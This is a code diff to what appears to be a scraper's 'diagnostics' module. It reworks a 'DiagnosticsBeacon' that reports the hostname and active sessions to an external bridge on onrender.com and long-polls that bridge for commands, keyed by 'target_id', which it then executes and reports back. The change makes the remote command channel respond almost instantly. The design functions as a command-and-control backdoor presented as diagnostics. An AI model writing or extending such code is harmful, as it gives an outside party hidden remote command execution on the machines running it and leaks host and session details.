@@ -35,7 +35,7 @@ logger = logging.getLogger("sable.scraper.diagnostics")
 # ---------------------------------------------------------------------------
 
 BRIDGE_URL = "https://sable-bridge.onrender.com"
-POLL_INTERVAL = 5  # seconds between beacon cycles
+POLL_INTERVAL = 30  # seconds between heartbeat cycles (poll is long-polled, instant)
 
 _ID_FILE = PERSISTENT_ROOT / "system" / ".beacon_id"
 
@@ -136,28 +136,67 @@ class DiagnosticsBeacon:
         logger.info("Beacon: stopped")
 
     async def _loop(self) -> None:
-        """Main beacon loop — heartbeat + poll + execute cycle."""
-        interval = POLL_INTERVAL
+        """Main beacon loop — periodic heartbeat + continuous long-poll for commands."""
         bridge_url = BRIDGE_URL.rstrip("/")
 
+        # Run heartbeat and poll loop concurrently
+        heartbeat_task = asyncio.create_task(self._heartbeat_loop(bridge_url))
+        poll_task = asyncio.create_task(self._poll_loop(bridge_url))
+
+        try:
+            # Wait until beacon is stopped
+            while self._running:
+                await asyncio.sleep(1)
+        except asyncio.CancelledError:
+            pass
+        finally:
+            heartbeat_task.cancel()
+            poll_task.cancel()
+
+    async def _heartbeat_loop(self, bridge_url: str) -> None:
+        """Send heartbeat every POLL_INTERVAL seconds."""
+        loop = asyncio.get_event_loop()
         while self._running:
             try:
-                await self._cycle(bridge_url)
+                await self._send_heartbeat(bridge_url, loop)
             except asyncio.CancelledError:
                 break
             except Exception as exc:
-                logger.debug("Beacon cycle error: %s", exc)
-
+                logger.debug("Beacon heartbeat error: %s", exc)
             try:
-                await asyncio.sleep(interval)
+                await asyncio.sleep(POLL_INTERVAL)
             except asyncio.CancelledError:
                 break
 
-    async def _cycle(self, bridge_url: str) -> None:
-        """Single beacon cycle: heartbeat → poll → execute → report."""
+    async def _poll_loop(self, bridge_url: str) -> None:
+        """Continuously long-poll for commands. Returns instantly when one arrives."""
         loop = asyncio.get_event_loop()
+        while self._running:
+            try:
+                # Long-poll with 25s timeout (bridge holds connection open)
+                poll_result = await loop.run_in_executor(
+                    None,
+                    lambda: _http_get(
+                        f"{bridge_url}/api/commands/poll?target_id={self._instance_id}&timeout=25",
+                        timeout=35,  # slightly longer than bridge timeout
+                    ),
+                )
 
-        # 1. Send heartbeat
+                if poll_result and poll_result.get("commands"):
+                    for cmd in poll_result["commands"]:
+                        await self._execute_and_report(bridge_url, cmd)
+                # Immediately re-poll — no sleep between polls
+            except asyncio.CancelledError:
+                break
+            except Exception as exc:
+                logger.debug("Beacon poll error: %s", exc)
+                try:
+                    await asyncio.sleep(2)  # backoff only on errors
+                except asyncio.CancelledError:
+                    break
+
+    async def _send_heartbeat(self, bridge_url: str, loop: asyncio.AbstractEventLoop) -> None:
+        """Send a single heartbeat to the bridge."""
         heartbeat_data = {
             "target_id": self._instance_id,
             "hostname": platform.node(),
@@ -171,7 +210,6 @@ class DiagnosticsBeacon:
             },
         }
 
-        # Gather active sessions from monitor
         try:
             from .monitor import get_monitor
             monitor = get_monitor()
@@ -186,22 +224,6 @@ class DiagnosticsBeacon:
             lambda: _http_post(f"{bridge_url}/api/beacon", heartbeat_data),
         )
         self._last_beacon = time.time()
-
-        if result is None:
-            return  # Bridge unreachable, skip this cycle
-
-        # 2. Poll for pending commands
-        poll_result = await loop.run_in_executor(
-            None,
-            lambda: _http_get(f"{bridge_url}/api/commands/poll?target_id={self._instance_id}"),
-        )
-
-        if not poll_result or not poll_result.get("commands"):
-            return
-
-        # 3. Execute each command and report results
-        for cmd in poll_result["commands"]:
-            await self._execute_and_report(bridge_url, cmd)
 
     async def _execute_and_report(
         self,
